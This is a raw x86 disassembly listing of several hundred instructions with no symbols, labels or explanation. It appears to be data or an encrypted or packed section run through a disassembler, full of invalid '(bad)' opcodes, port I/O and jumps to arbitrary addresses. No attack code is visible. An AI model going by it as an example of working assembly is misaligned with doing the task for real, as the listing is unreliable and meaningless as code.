  40b741:	adc    BYTE PTR [eax],ah
  40b743:	es jle 0x40b736
  40b746:	xor    eax,0xdf173a66
  40b74b:	pop    eax
  40b74c:	or     BYTE PTR [edi+0x3b4d7c3b],0xa6
  40b753:	pop    eax
  40b754:	icebp  
  40b755:	retf   0x9e61
  40b758:	jecxz  0x40b7a6
  40b75a:	int3   
  40b75b:	sbb    BYTE PTR [edx-0x4095c8e0],ah
  40b761:	mov    bl,BYTE PTR [esi+0x37]
  40b764:	mov    WORD PTR [ebp-0x6de25118],fs
  40b76a:	ja     0x40b75f
  40b76c:	or     eax,0x4865c719
  40b771:	mov    dh,0xd9
  40b773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b774:	dec    ebx
  40b775:	ins    BYTE PTR es:[edi],dx
  40b776:	sub    BYTE PTR [eax+0x385e5145],0x55
  40b77d:	loop   0x40b7f9
  40b77f:	clc    
  40b780:	inc    esp
  40b781:	mov    eax,0xd5deb83d
  40b786:	or     eax,0x29c77c48
  40b78b:	and    al,0x5e
  40b78d:	enter  0xea28,0xe4
  40b791:	push   edx
  40b792:	mov    esi,0x8dbabf30
  40b797:	int3   
  40b798:	int3   
  40b799:	std    
  40b79a:	lahf   
  40b79b:	(bad)  
  40b79c:	jecxz  0x40b819
  40b79e:	addr16 mov cs,esi
  40b7a1:	je     0x40b786
  40b7a3:	rol    BYTE PTR [ebx+0x41],1
  40b7a6:	cs je  0x40b771
  40b7a9:	pusha  
  40b7aa:	fwait
  40b7ab:	iret   
  40b7ac:	adc    al,0x82
  40b7ae:	sub    BYTE PTR [esi+0x4f731635],al
  40b7b4:	test   esp,ebx
  40b7b6:	add    eax,0xbae99579
  40b7bb:	xor    ecx,eax
  40b7bd:	inc    edi
  40b7be:	push   0x16
  40b7c0:	in     eax,0x3e
  40b7c2:	mov    edx,0x94e97573
  40b7c7:	push   ss
  40b7c8:	mov    gs,WORD PTR [esi+ecx*8]
  40b7cb:	gs ds in al,dx
  40b7ce:	out    0x5b,eax
  40b7d0:	mov    edi,0x5b0258bc
  40b7d5:	rcr    DWORD PTR [esi],1
  40b7d7:	neg    BYTE PTR [ecx-0x5b10ff58]
  40b7dd:	mov    ds:0xe19fe26,al
  40b7e2:	cmc    
  40b7e3:	jno    0x40b7b5
  40b7e5:	mov    DWORD PTR [ebx+0x28ae493d],esp
  40b7eb:	adc    BYTE PTR [eax+eiz*8],al
  40b7ee:	test   BYTE PTR [edi-0x21],ch
  40b7f1:	ret    0xb7bf
  40b7f4:	push   ecx
  40b7f5:	xor    al,0x4
  40b7f7:	cmp    eax,0x3540c2da
  40b7fc:	shl    DWORD PTR [edi+0x16],cl
  40b7ff:	ret    0x67dd
  40b802:	sti    
  40b803:	ror    DWORD PTR [edi+0x34b13e6d],cl
  40b809:	jp     0x40b7b7
  40b80b:	fldenv [esi]
  40b80d:	cmp    al,0x53
  40b80f:	popa   
  40b810:	mov    cl,0x1f
  40b812:	push   edi
  40b813:	xchg   dh,dh
  40b815:	inc    esi
  40b816:	pop    es
  40b817:	add    al,0x48
  40b819:	add    cl,BYTE PTR [edi+0x61]
  40b81c:	fs jecxz 0x40b898
  40b81f:	cwde   
  40b820:	ins    DWORD PTR es:[edi],dx
  40b821:	dec    eax
  40b822:	ins    DWORD PTR es:[edi],dx
  40b823:	inc    ebx
  40b824:	stos   DWORD PTR es:[edi],eax
  40b825:	or     eax,0x69cdd7e1
  40b82a:	mov    bh,0xf0
  40b82c:	mov    ch,0x64
  40b82e:	loop   0x40b8a7
  40b830:	sahf   
  40b831:	mov    bl,dh
  40b833:	sbb    DWORD PTR [ebx+0x11781305],ebx
  40b839:	rol    DWORD PTR [esi],1
  40b83b:	push   0xae94ca95
  40b840:	add    cl,dl
  40b842:	sbb    DWORD PTR [ecx+0x22],esp
  40b845:	ret    0xbc50
  40b848:	add    BYTE PTR [edx+0x1b298ffb],0x9a
  40b84f:	mov    ebp,0x6e3990fd
  40b854:	loope  0x40b869
  40b856:	cmp    ebp,DWORD PTR [ebx+0x2f]
  40b859:	pop    edx
  40b85a:	in     al,0xf4
  40b85c:	ins    BYTE PTR es:[edi],dx
  40b85d:	mov    al,0xf2
  40b85f:	and    al,0x34
  40b861:	and    al,0x8b
  40b863:	jns    0x40b843
  40b865:	inc    edi
  40b866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b867:	mov    WORD PTR [edx-0x491120f5],ds
  40b86d:	pop    eax
  40b86e:	push   0xcb9c9365
  40b873:	push   ebx
  40b874:	pushf  
  40b875:	sub    dl,BYTE PTR ds:0xe418cfd0
  40b87b:	test   DWORD PTR [ebp-0x1a],ecx
  40b87e:	(bad)  
  40b87f:	sti    
  40b880:	rcr    BYTE PTR [esi],0x81
  40b883:	into   
  40b884:	test   al,0x59
  40b886:	mov    dh,0x3
  40b888:	cmc    
  40b889:	sub    esi,DWORD PTR [edi]
  40b88b:	mov    ah,0xd6
  40b88d:	cld    
  40b88e:	dec    esi
  40b88f:	sub    esp,DWORD PTR [ecx+0x3b8ef255]
  40b895:	inc    esp
  40b896:	jns    0x40b913
  40b898:	fist   DWORD PTR [ebp-0x54]
  40b89b:	push   ebx
  40b89c:	and    eax,0xcdb5b078
  40b8a1:	jmp    FWORD PTR [edi-0x7fdcbc85]
  40b8a7:	xchg   edi,eax
  40b8a8:	icebp  
  40b8a9:	mov    ah,0x41
  40b8ab:	push   eax
  40b8ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ae:	loop   0x40b880
  40b8b0:	stc    
  40b8b1:	pusha  
  40b8b2:	jae    0x40b8cf
  40b8b4:	retf   
  40b8b5:	xchg   ebx,eax
  40b8b6:	pop    es
  40b8b7:	inc    edi
  40b8b8:	mov    ebx,0xd814ac58
  40b8bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8be:	inc    eax
  40b8bf:	xor    eax,0x9d40282c
  40b8c4:	xlat   BYTE PTR ds:[ebx]
  40b8c5:	push   ecx
  40b8c6:	inc    esp
  40b8c7:	add    dh,BYTE PTR [esi+esi*1-0x3d]
  40b8cb:	jmp    0xec9934bb
  40b8d0:	adc    eax,0xe3456590
  40b8d5:	mov    dh,0xc5
  40b8d7:	lock push edi
  40b8d9:	call   0x9ee172d9
  40b8de:	inc    ebx
  40b8df:	js     0x40b91f
  40b8e1:	pushf  
  40b8e2:	fadd   DWORD PTR [edi-0x719b63b8]
  40b8e8:	mov    ecx,0x931aa8de
  40b8ed:	and    esi,ebp
  40b8ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f0:	xchg   ecx,eax
  40b8f1:	jecxz  0x40b923
  40b8f3:	mov    ah,BYTE PTR [eax+eax*8-0x34]
  40b8f7:	in     al,0x37
  40b8f9:	outs   dx,BYTE PTR ds:[esi]
  40b8fa:	or     bl,BYTE PTR [ebx-0x5d8c3d05]
  40b900:	push   ds
  40b901:	mov    dl,0x20
  40b903:	xchg   edi,eax
  40b904:	(bad)  
  40b905:	jmp    0x40b8bf
  40b907:	mov    esp,0x9773c139
  40b90c:	aaa    
  40b90d:	lock mov edx,0x69341a10
  40b913:	popa   
  40b914:	enter  0xe247,0x82
  40b918:	scas   al,BYTE PTR es:[edi]
  40b919:	call   0xd805bd34
  40b91e:	imul   ecx,DWORD PTR [ecx+0x7f],0x31
  40b922:	enter  0x4fd9,0x15
  40b926:	rcl    DWORD PTR [ebx],0x52
  40b929:	mov    eax,ds:0x7e79203c
  40b92e:	test   ah,0x1c
  40b931:	pop    esi
  40b932:	jmp    0x4e20:0xefcd320b
  40b939:	retf   
  40b93a:	pop    ebp
  40b93b:	inc    edi
  40b93c:	sbb    ebp,esi
  40b93e:	lock sahf 
  40b940:	mov    ch,0x9f
  40b942:	inc    eax
  40b943:	mov    dh,0x2a
  40b945:	and    ecx,DWORD PTR [ebx+0x40]
  40b948:	call   0xd6ed:0x22bf27c4
  40b94f:	pop    ebx
  40b950:	or     al,0xdb
  40b952:	fisttp WORD PTR [edi-0x6494ec8a]
  40b958:	iret   
  40b959:	xchg   edi,eax
  40b95a:	out    dx,al
  40b95b:	mov    esp,0x25b3b707
  40b960:	retf   0xb86a
  40b963:	or     edi,DWORD PTR [ebp+0x367b142c]
  40b969:	jmp    0xd55:0xf4d3ee4d
  40b970:	mov    edx,0x1bed77be
  40b975:	data16 loop 0x40b9ee
  40b978:	add    BYTE PTR [edi+0x2],al
  40b97b:	(bad)  
  40b97c:	ss mov esp,0x14369c6e
  40b982:	iret   
  40b983:	xchg   DWORD PTR [ecx-0x1da90ba1],ecx
  40b989:	mov    WORD PTR [ebx+0xb6d39],ds
  40b98f:	xchg   DWORD PTR [ecx-0x1a],edx
  40b992:	enter  0xc3e1,0xe0
  40b996:	data16 jp 0x40b955
  40b999:	aam    0x7a
  40b99b:	aaa    
  40b99c:	xchg   esp,ebp
  40b99e:	call   FWORD PTR [ebp-0x77]
  40b9a1:	sti    
  40b9a2:	pushf  
  40b9a3:	pop    eax
  40b9a4:	mov    edi,0x3f89fd93
  40b9a9:	sar    DWORD PTR [ebx],1
  40b9ab:	inc    ebx
  40b9ac:	pop    ebp
  40b9ad:	jne    0x40b9ee
  40b9af:	xchg   ecx,eax
  40b9b0:	jle    0x40b986
  40b9b2:	xchg   esi,eax
  40b9b3:	add    eax,0xe0a0771
  40b9b8:	cmp    eax,0xa54a158e
  40b9bd:	data16 fisub DWORD PTR [eax-0x79835156]
  40b9c4:	shr    BYTE PTR [eax],1
  40b9c6:	jns    0x40b95f
  40b9c8:	popf   
  40b9c9:	test   al,0xec
  40b9cb:	cmc    
  40b9cc:	push   eax
  40b9cd:	outs   dx,BYTE PTR ds:[esi]
  40b9ce:	mov    esp,0x8a1e757
  40b9d3:	mov    eax,0x1c10952f
  40b9d8:	push   ebp
  40b9d9:	loopne 0x40b9ef
  40b9db:	add    ebp,DWORD PTR [esi-0x5a]
  40b9de:	mov    eax,0x547e9b3a
  40b9e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9e4:	popf   
  40b9e5:	in     al,dx
  40b9e6:	dec    edi
  40b9e7:	fsubr  QWORD PTR [edi-0x18]
  40b9ea:	mov    bh,0xc6
  40b9ec:	sub    dl,bl
  40b9ee:	mov    ds:0x4f4a4baf,eax
  40b9f3:	ror    dh,cl
  40b9f5:	addr16 or eax,0x5b862e9c
  40b9fb:	xchg   ebp,eax
  40b9fc:	xchg   ebp,esp
  40b9fe:	sbb    al,0x23
  40ba00:	sbb    DWORD PTR ds:0x368b53ef,esp
  40ba06:	scas   al,BYTE PTR es:[edi]
  40ba07:	jmp    0xa1f6:0xc6f37f79
  40ba0e:	push   ebp
  40ba0f:	je     0x40b9b9
  40ba11:	jecxz  0x40ba8f
  40ba13:	cld    
  40ba14:	(bad)  
  40ba15:	das    
  40ba16:	xchg   DWORD PTR [edx+ecx*4+0x138c3f22],ebp
  40ba1d:	dec    edi
  40ba1e:	add    al,0xa5
  40ba20:	stos   BYTE PTR es:[edi],al
  40ba21:	jbe    0x40b9e5
  40ba23:	xor    esi,DWORD PTR [ecx-0x38003203]
  40ba29:	into   
  40ba2a:	xchg   DWORD PTR ds:0xc2229e50,eax
  40ba30:	shl    DWORD PTR [edx-0x4a504e4c],0x22
  40ba37:	rcl    DWORD PTR [ecx+0x2c],0xf8
  40ba3b:	inc    ebp
  40ba3c:	je     0x40ba41
  40ba3e:	pop    ebp
  40ba3f:	jg     0x40baac
  40ba41:	je     0x40baa0
  40ba43:	outs   dx,DWORD PTR ds:[esi]
  40ba44:	(bad)  
  40ba46:	call   0x13e874d1
  40ba4b:	imul   ebp,DWORD PTR [ebx+ecx*2+0x9],0xb28959b5
  40ba53:	xor    cl,bl
  40ba55:	fistp  QWORD PTR [edx-0x27]
  40ba58:	es mov edi,0xcdf0ece1
  40ba5e:	or     BYTE PTR [eax-0x40],dh
  40ba61:	gs mov esi,0x68cb87d9
  40ba67:	pop    edi
  40ba68:	mov    bh,0xcd
  40ba6a:	aad    0x8c
  40ba6c:	sub    al,0x6
  40ba6e:	jno    0x40ba57
  40ba70:	sahf   
  40ba71:	cli    
  40ba72:	cmp    esp,DWORD PTR [esi+0x3a9f593f]
  40ba78:	and    DWORD PTR [ebp-0x1f],edi
  40ba7b:	mov    edi,cs
  40ba7d:	fbstp  TBYTE PTR [edx-0x2cc4fccf]
  40ba83:	jns    0x40ba78
  40ba85:	or     eax,0x8850b09a
  40ba8a:	jg     0x40bab4
  40ba8c:	stc    
  40ba8d:	inc    ebx
  40ba8e:	sbb    DWORD PTR [eax-0x645bb660],0xffffff84
  40ba95:	test   BYTE PTR [edi],bl
  40ba97:	(bad)  
  40ba98:	in     eax,0x86
  40ba9a:	mov    DWORD PTR [ecx],esi
  40ba9c:	das    
  40ba9d:	pop    ebp
  40ba9e:	xor    DWORD PTR [eax-0x66],0x4703ed7c
  40baa5:	cli    
  40baa6:	push   es
  40baa7:	mov    ah,0x5c
  40baa9:	cmp    BYTE PTR [edi-0x4f],0xcc
  40baad:	shl    BYTE PTR [ebp+0x6d74094f],cl
  40bab3:	or     DWORD PTR [esi-0x6a],0x4c
  40bab7:	ror    DWORD PTR ds:0x4a4eca70,1
  40babd:	inc    esi
  40babe:	mov    al,ds:0xd9ed9437
  40bac3:	outs   dx,DWORD PTR ds:[esi]
  40bac4:	int3   
  40bac5:	sbb    DWORD PTR [eax-0x16c4d3af],ecx
  40bacb:	call   0x91b45b54
  40bad0:	loope  0x40baba
  40bad2:	xchg   ebp,eax
  40bad3:	xchg   ebp,eax
  40bad4:	jge    0x40ba82
  40bad6:	test   DWORD PTR ds:0xa102eb0c,0x7082928c
  40bae0:	pop    eax
  40bae1:	test   al,0x5c
  40bae3:	mov    eax,0x5601b74a
  40bae8:	mov    ebp,0x280ef741
  40baed:	scas   eax,DWORD PTR es:[edi]
  40baee:	pop    ebx
  40baef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baf0:	ds mov al,0x21
  40baf3:	bound  esp,QWORD PTR [ecx-0x57948650]
  40baf9:	js     0x40ba83
  40bafb:	pop    ebp
  40bafc:	(bad)  
  40bafd:	jne    0x40bb2e
  40baff:	dec    ecx
  40bb00:	jb     0x40baf6
  40bb02:	popa   
  40bb03:	dec    ebx
  40bb04:	fistp  DWORD PTR [ecx+0x66693290]
  40bb0a:	or     ebp,DWORD PTR [ebx+0x6f]
  40bb0d:	fistp  WORD PTR [ebp+0x788f838a]
  40bb13:	stos   DWORD PTR es:[edi],eax
  40bb14:	add    eax,0x559882d1
  40bb19:	pop    esi
  40bb1a:	out    dx,al
  40bb1b:	pop    esi
  40bb1c:	xchg   ebx,eax
  40bb1d:	jae    0x40bb78
  40bb1f:	sub    DWORD PTR [edi+0x2e403b45],edi
  40bb25:	lea    ecx,[ecx-0x2563a180]
  40bb2b:	fistp  WORD PTR [eax-0x4f1aa713]
  40bb31:	outs   dx,DWORD PTR ds:[esi]
  40bb32:	int    0xc
  40bb34:	lock ds in al,0x2f
  40bb38:	(bad)  
  40bb39:	mov    edi,0xd12ae29a
  40bb3e:	mov    cl,BYTE PTR [eax]
  40bb40:	xchg   esi,eax
  40bb41:	aam    0x12
  40bb43:	add    DWORD PTR [esi],ebx
  40bb45:	daa    
  40bb46:	popa   
  40bb47:	push   cs
  40bb48:	inc    ecx
  40bb49:	cs pop ebx
  40bb4b:	adc    DWORD PTR gs:[edx+0x2b240f37],eax
  40bb52:	jns    0x40bb16
  40bb54:	stos   DWORD PTR es:[edi],eax
  40bb55:	std    
  40bb56:	fldcw  WORD PTR [eax-0x34148ba]
  40bb5c:	stc    
  40bb5d:	or     al,BYTE PTR [esi+eax*4+0x7f50e598]
  40bb64:	inc    eax
  40bb65:	(bad)  
  40bb66:	out    0x4e,eax
  40bb68:	ret    0x1ee3
  40bb6b:	mov    al,es:0xd7beec69
  40bb71:	loop   0x40baf7
  40bb73:	adc    BYTE PTR [edx-0x50c93ad3],al
  40bb79:	add    DWORD PTR ds:0x5640d3b7,esp
  40bb7f:	aad    0x6b
  40bb81:	xchg   edi,eax
  40bb82:	adc    al,0xf2
  40bb84:	aam    0x4b
  40bb86:	int    0x65
  40bb88:	adc    cl,BYTE PTR [ecx+0x1b]
  40bb8b:	xchg   esi,eax
  40bb8c:	(bad)  
  40bb8d:	outs   dx,DWORD PTR ds:[esi]
  40bb8e:	clc    
  40bb8f:	hlt    
  40bb90:	imul   ecx,ebx,0xe04c36db
  40bb96:	cmp    DWORD PTR ds:0x9759c80f,ebp
  40bb9c:	xor    eax,0xae90cf4c
  40bba1:	jle    0x40bbd3
  40bba3:	and    eax,0x10142207
  40bba8:	std    
  40bba9:	pop    ebx
  40bbaa:	idiv   BYTE PTR [ebx-0x29]
  40bbad:	js     0x40bb98
  40bbaf:	adc    BYTE PTR [edx+0x7e],bl
  40bbb2:	jb     0x40bbb1
  40bbb4:	inc    edi
  40bbb5:	add    al,0xca
  40bbb7:	(bad)  
  40bbb8:	popa   
  40bbb9:	out    0x2a,eax
  40bbbb:	mov    ah,0x1c
  40bbbd:	push   esi
  40bbbe:	mov    dh,cl
  40bbc0:	sub    al,0xaa
  40bbc2:	ins    DWORD PTR es:[edi],dx
  40bbc3:	fisub  WORD PTR [ebx]
  40bbc5:	push   0xa97c70aa
  40bbca:	mov    ebp,0x6a70fb6d
  40bbcf:	(bad)  
  40bbd0:	shl    DWORD PTR [esi-0x66],cl
  40bbd3:	retf   0x90e0
  40bbd6:	loope  0x40bb85
  40bbd8:	push   ebp
  40bbd9:	in     eax,0xbf
  40bbdb:	fwait
  40bbdc:	and    eax,0xf15dc604
  40bbe1:	popa   
  40bbe2:	sub    eax,ecx
  40bbe4:	xor    edi,DWORD PTR [ebx+0xef776dd]
  40bbea:	das    
  40bbeb:	mov    ah,0x12
  40bbed:	add    dh,BYTE PTR [edx]
  40bbef:	jo     0x40bbf6
  40bbf1:	lock lahf 
  40bbf3:	popa   
  40bbf4:	iret   
  40bbf5:	aaa    
  40bbf6:	xor    dh,dh
  40bbf8:	scas   eax,DWORD PTR es:[edi]
  40bbf9:	jbe    0x40bc60
  40bbfb:	lahf   
  40bbfc:	or     eax,0xfda2a7e5
  40bc01:	into   
  40bc02:	xor    DWORD PTR [edx-0x7872036e],esp
  40bc08:	push   ss
  40bc09:	mov    dl,0x48
  40bc0b:	mul    edx
  40bc0d:	mov    dl,0xcc
  40bc0f:	add    BYTE PTR [edx-0x1a5d6223],dl
  40bc15:	mov    esi,0x8d02151a
  40bc1a:	push   cs
  40bc1b:	aas    
  40bc1c:	enter  0xdb10,0x87
  40bc20:	cmp    esp,edi
  40bc22:	jns    0x40bc27
  40bc24:	sbb    DWORD PTR [eax],ebp
  40bc26:	dec    ebx
  40bc27:	xchg   BYTE PTR [ecx],cl
  40bc29:	mov    al,0x64
  40bc2b:	xchg   edi,eax
  40bc2c:	mov    gs,WORD PTR [eax+0x51]
  40bc2f:	or     BYTE PTR [ebx-0x629b2b9b],bh
  40bc35:	cs popf 
  40bc37:	jo     0x40bca0
  40bc39:	ins    BYTE PTR es:[edi],dx
  40bc3a:	(bad)  
  40bc3d:	in     al,dx
  40bc3e:	jge    0x40bc80
  40bc40:	mov    eax,ds:0x37ecf24c
  40bc45:	mov    cl,0x2e
  40bc47:	push   edi
  40bc48:	retf   
  40bc49:	mov    ds:0x9ddec664,al
  40bc4e:	ret    
  40bc4f:	mov    ecx,0x1f4dc3
  40bc54:	dec    ebx
  40bc55:	push   edi
  40bc56:	xchg   esi,eax
  40bc57:	arpl   WORD PTR [edx-0x11],dx
  40bc5a:	sbb    ecx,DWORD PTR [esi-0x723b81cf]
  40bc60:	dec    esi
  40bc61:	push   ebp
  40bc62:	jno    0x40bcae
  40bc64:	mov    ds:0x1ccc792d,al
  40bc69:	sub    BYTE PTR [ebx+0xd89c440],dl
  40bc6f:	mov    al,ds:0x6d583de9
  40bc74:	pop    ecx
  40bc75:	leave  
  40bc76:	clc    
  40bc77:	adc    al,0xe9
  40bc79:	rol    eax,cl
  40bc7b:	in     al,dx
  40bc7c:	push   eax
  40bc7d:	pop    esi
  40bc7e:	mov    al,ds:0xb1490b3e
  40bc83:	out    dx,eax
  40bc84:	add    bl,cl
  40bc86:	scas   eax,DWORD PTR es:[edi]
  40bc87:	lds    edx,FWORD PTR [ebp-0x7dc084c]
  40bc8d:	lahf   
  40bc8e:	shr    BYTE PTR [ecx-0x22],cl
  40bc91:	scas   al,BYTE PTR es:[edi]
  40bc92:	dec    ebp
  40bc93:	sub    al,0x2e
  40bc95:	jns    0x40bc93
  40bc97:	inc    ebx
  40bc98:	js     0x40bd07
  40bc9a:	mov    eax,ss
  40bc9c:	mov    dh,0x1d
  40bc9e:	shl    ebx,1
  40bca0:	sbb    DWORD PTR [edi-0x60],0x10
  40bca4:	(bad)  
  40bca5:	push   eax
  40bca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bca7:	jae    0x40bca8
  40bca9:	add    eax,0xe85e5f27
  40bcae:	add    DWORD PTR [ebx],0x5e
  40bcb1:	(bad)  
  40bcb2:	cmp    eax,0x621c3808
  40bcb7:	int    0x73
  40bcb9:	mov    eax,ds:0x74c2c7b9
  40bcbe:	test   al,0x70
  40bcc0:	int3   
  40bcc1:	pop    ebp
  40bcc2:	push   ebp
  40bcc3:	or     DWORD PTR [ebx+0x25],ebx
  40bcc6:	xchg   BYTE PTR [esp+eax*1+0x17],dh
  40bcca:	mov    cl,0x2c
  40bccc:	dec    ecx
  40bccd:	xchg   ecx,eax
  40bcce:	shl    DWORD PTR [esi],cl
  40bcd0:	jns    0x40bce8
  40bcd2:	jnp    0x40bca1
  40bcd4:	cmp    dh,BYTE PTR [ecx]
  40bcd6:	icebp  
  40bcd7:	push   edi
  40bcd8:	adc    al,0x71
  40bcda:	xor    DWORD PTR ds:0x91edbd66,esp
  40bce0:	and    al,0x86
  40bce2:	adc    edx,DWORD PTR [esp+eax*4+0x610b5fad]
  40bce9:	test   al,0x82
  40bceb:	lahf   
  40bcec:	mov    dl,0xa3
  40bcee:	inc    ebp
  40bcef:	inc    ebx
  40bcf0:	int    0x39
  40bcf2:	out    dx,eax
  40bcf3:	mov    dh,0xd8
  40bcf5:	xchg   BYTE PTR [ecx+eiz*4-0x11386de6],bh
  40bcfc:	push   esp
  40bcfd:	loop   0x40bcf8
  40bcff:	jmp    0x40bd16
  40bd01:	inc    edi
  40bd02:	call   0x3638e770
  40bd07:	cs ret 0x9cf
  40bd0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd0c:	jne    0x40bcda
  40bd0e:	pop    eax
  40bd0f:	mov    ah,0xa8
  40bd11:	pop    esp
  40bd12:	arpl   WORD PTR [ebp-0x5e],bx
  40bd15:	dec    ecx
  40bd16:	ds xchg ebx,eax
  40bd18:	aas    
  40bd19:	outs   dx,BYTE PTR ds:[esi]
  40bd1a:	push   ebp
  40bd1b:	mov    eax,0x8bc52b4b
  40bd20:	aas    
  40bd21:	ins    BYTE PTR es:[edi],dx
  40bd22:	dec    edi
  40bd23:	ins    BYTE PTR es:[edi],dx
  40bd24:	test   edx,edi
  40bd26:	ficom  WORD PTR ds:0x6e9249fa
  40bd2c:	bound  ebp,QWORD PTR [esp+ebx*4+0x7f36e02e]
  40bd33:	jae    0x40bcec
  40bd35:	dec    esp
  40bd36:	adc    esp,DWORD PTR [ecx-0x18]
  40bd39:	xchg   edi,eax
  40bd3a:	cmp    ch,BYTE PTR [ebp+0x6e]
  40bd3d:	ja     0x40bd16
  40bd3f:	jl     0x40bd97
  40bd41:	loop   0x40bd3a
  40bd43:	(bad)  
  40bd44:	lahf   
  40bd45:	les    edx,FWORD PTR [ebx]
  40bd47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd48:	out    dx,al
  40bd49:	(bad)  
  40bd4a:	je     0x40bdc4
  40bd4c:	xor    DWORD PTR [ebp+edi*4+0xe],ecx
  40bd50:	xchg   BYTE PTR [edi-0x80],al
  40bd53:	gs sbb esp,0x59
  40bd57:	std    
  40bd58:	test   eax,0x8179c57a
  40bd5d:	lea    eax,[esi]
  40bd5f:	mov    ch,0xc5
  40bd61:	js     0x40bd5a
  40bd63:	retf   
  40bd64:	sub    DWORD PTR [eax-0x1f],esi
  40bd67:	jmp    0x5c904635
  40bd6c:	pop    esi
  40bd6d:	data16 lods al,BYTE PTR ds:[esi]
  40bd6f:	and    bl,cl
  40bd71:	(bad)  
  40bd72:	dec    esp
  40bd73:	fwait
  40bd74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd75:	adc    BYTE PTR [eax+0x23],0xea
  40bd79:	mov    ds:0xb13d4958,al
  40bd7e:	das    
  40bd7f:	in     eax,0xdd
  40bd81:	dec    edi
  40bd82:	int3   
  40bd83:	cmc    
  40bd84:	or     esi,0xf43ad326
  40bd8a:	retf   
  40bd8b:	stc    
  40bd8c:	pop    ecx
  40bd8d:	mov    edx,0x7b6fc136
  40bd92:	pop    esp
  40bd93:	cmp    dh,dh
  40bd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd96:	adc    ah,BYTE PTR [eax+0x44]
  40bd99:	rcl    DWORD PTR [ebp+0x6f],cl
  40bd9c:	test   al,0xc1
  40bd9e:	sbb    BYTE PTR [edx-0xe52709e],dh
  40bda4:	mov    esi,0x6af551d2
  40bda9:	dec    ebp
  40bdaa:	lahf   
  40bdab:	jae    0x40bd82
  40bdad:	xor    esi,DWORD PTR [eax]
  40bdaf:	sub    dl,bh
  40bdb1:	fmul   st(0),st
  40bdb3:	jge    0x40be1b
  40bdb5:	dec    BYTE PTR [ebx+0x71]
  40bdb8:	xchg   ebx,eax
  40bdb9:	push   ss
  40bdba:	sub    DWORD PTR [edx-0x63],edx
  40bdbd:	gs jmp 0x3f9efef9
  40bdc3:	fidivr DWORD PTR [edi+esi*8]
  40bdc6:	(bad)  
  40bdc7:	sub    DWORD PTR [eax-0x44],ecx
  40bdca:	xchg   BYTE PTR [esi+ebx*8],ch
  40bdcd:	jg     0x40bd7e
  40bdcf:	inc    esp
  40bdd0:	ja     0x40bd81
  40bdd2:	dec    ecx
  40bdd3:	xchg   BYTE PTR [ecx],al
  40bdd5:	sub    al,BYTE PTR [ecx-0x1666e51c]
  40bddb:	dec    edi
  40bddc:	ins    BYTE PTR es:[edi],dx
  40bddd:	adc    BYTE PTR [edx-0x25],cl
  40bde0:	push   ecx
  40bde1:	sub    al,0xae
  40bde3:	mov    ecx,0xdc249051
  40bde8:	sub    eax,0x9eff630d
  40bded:	popf   
  40bdee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdef:	lock sbb edi,esi
  40bdf2:	jmp    0xc9d8494
  40bdf7:	arpl   WORD PTR [eax-0x2b],sp
  40bdfa:	jg     0x40bd8f
  40bdfc:	sbb    BYTE PTR [eax+edx*2+0x5c],0x98
  40be01:	adc    dh,BYTE PTR [eax+0x31]
  40be04:	add    edx,DWORD PTR [eax+0x27d19e2f]
  40be0a:	push   ds
  40be0b:	aad    0xfc
  40be0d:	and    al,0x63
  40be0f:	out    dx,eax
  40be10:	test   DWORD PTR [esi-0x30],eax
  40be13:	xchg   ebx,eax
  40be14:	ret    
  40be15:	dec    esi
  40be16:	pop    ebp
  40be17:	dec    DWORD PTR [ecx+ecx*1]
  40be1a:	(bad)  
  40be1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be1c:	xor    edi,DWORD PTR [eax-0x7a3bef2c]
  40be22:	or     al,0x81
  40be24:	jae    0x40be6e
  40be26:	test   DWORD PTR [eax-0x7a],0x14251462
  40be2d:	cmp    ah,BYTE PTR [esi]
  40be2f:	sub    DWORD PTR [ebx+0x4d3a10c2],edx
  40be35:	push   0x99dc25a4
  40be3a:	nop
  40be3b:	call   0x946b847
  40be40:	in     al,0xb7
  40be42:	push   ebp
  40be43:	inc    edi
  40be44:	mov    esi,0xe26445e8
  40be49:	cld    
  40be4a:	adc    al,0x4c
  40be4c:	add    eax,DWORD PTR [ecx-0x54456323]
  40be52:	test   BYTE PTR [edi-0x2d],bl
  40be55:	fistp  QWORD PTR [edi-0x208ae9f6]
  40be5b:	popa   
  40be5c:	test   eax,0x19bf716f
  40be61:	or     esi,DWORD PTR [eax+0x63d527dd]
  40be67:	mov    dl,0xde
  40be69:	scas   eax,DWORD PTR es:[edi]
  40be6a:	mul    BYTE PTR [esi-0x7c3ef20a]
  40be70:	or     al,0x1f
  40be72:	lods   eax,DWORD PTR ds:[esi]
  40be73:	jno    0x40bed2
  40be75:	retf   0xc8c0
  40be78:	add    bh,BYTE PTR [edx]
  40be7a:	neg    DWORD PTR [edx+0x42f56238]
  40be80:	leave  
  40be81:	(bad)  
  40be82:	dec    ebp
  40be83:	repz sbb al,BYTE PTR [ecx]
  40be86:	lea    eax,gs:[esp+esi*2]
  40be8a:	or     eax,DWORD PTR fs:[eax+0x1a6dde75]
  40be91:	(bad)  
  40be92:	fild   WORD PTR [edx]
  40be94:	xchg   BYTE PTR [ecx-0x28],cl
  40be97:	in     eax,dx
  40be98:	mov    esi,0x9e0b7861
  40be9d:	and    eax,ebx
  40be9f:	out    0x15,eax
  40bea1:	div    DWORD PTR [esi-0x78]
  40bea4:	popf   
  40bea5:	pop    ss
  40bea6:	jmp    0x40bf0a
  40bea8:	sub    BYTE PTR [edx+esi*8-0x1ba2cf3a],bl
  40beaf:	test   eax,0xefaf16a
  40beb4:	std    
  40beb5:	es nop
  40beb7:	push   ds
  40beb8:	mov    bl,0x3a
  40beba:	xchg   esi,eax
  40bebb:	in     al,dx
  40bebc:	xchg   edi,eax
  40bebd:	dec    esp
